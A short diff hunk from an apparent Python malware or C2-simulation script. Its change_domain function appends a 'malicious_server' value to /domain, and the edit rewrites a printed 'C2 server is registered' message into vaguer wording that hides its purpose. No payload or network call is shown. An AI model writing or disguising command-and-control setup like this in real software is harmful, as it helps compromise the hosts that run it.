@@ -18,7 +18,7 @@ def change_domain(domain):
     with open("/domain", 'a') as a_writer:
         a_writer.write(domain)
 
-print("The C2 server is registered at : " + malicious_server)
+print("The new 2 server is at : " + malicious_server)
 
 change_domain(malicious_server)
 
